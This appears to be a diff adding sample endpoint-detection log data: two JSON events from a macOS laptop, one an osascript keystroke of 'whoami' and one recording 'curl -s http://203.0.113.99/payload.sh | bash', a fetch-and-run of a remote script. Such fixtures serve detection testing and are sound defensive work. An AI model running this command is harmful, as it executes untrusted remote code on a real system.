@@ -1,0 +1,28 @@
+{
+  "events": [
+    {
+      "event_id": "edr-000001",
+      "timestamp": "2026-07-08T14:30:05Z",
+      "hostname": "eng-laptop-3391",
+      "os": "macOS",
+      "process_name": "osascript",
+      "parent_process": "Terminal",
+      "command_line": "osascript -e 'tell application \"System Events\" to keystroke \"whoami\"'",
+      "user": "d.zaki",
+      "sha256": "a3f1c9e2b7d4...example",
+      "action": "process_start"
+    },
+    {
+      "event_id": "edr-000002",
+      "timestamp": "2026-07-08T14:31:47Z",
+      "hostname": "eng-laptop-3391",
+      "os": "macOS",
+      "process_name": "curl",
+      "parent_process": "bash",
+      "command_line": "curl -s http://203.0.113.99/payload.sh | bash",
+      "user": "d.zaki",
+      "sha256": "b7c2f8a1d3e9...example",
+      "action": "process_start"
+    }
+  ]
+}
